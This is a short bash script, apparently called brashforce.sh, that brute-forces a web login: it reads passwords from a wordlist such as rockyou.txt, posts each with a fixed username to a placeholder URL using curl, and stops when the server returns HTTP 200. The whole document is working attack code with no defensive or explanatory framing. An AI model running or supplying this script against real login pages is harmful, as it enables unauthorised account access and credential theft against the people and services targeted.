#!/bin/bash
#Usage: ./brashforce.sh rockyou.txt

while IFS='' read -r pass || [[ -n "$pass" ]]; do
    echo "User: 'USER_HERE' Pass: '$pass'"
    http_code=$(curl -L --data-urlencode username="USER_HERE" --data-urlencode password="$pass" "URL_HERE" -w '%{http_code}' -o /dev/null -s)
    if [[ $http_code -eq 200 ]]; then
	echo "Success! Pass: '$pass'"
	break
    fi
done < "$1"
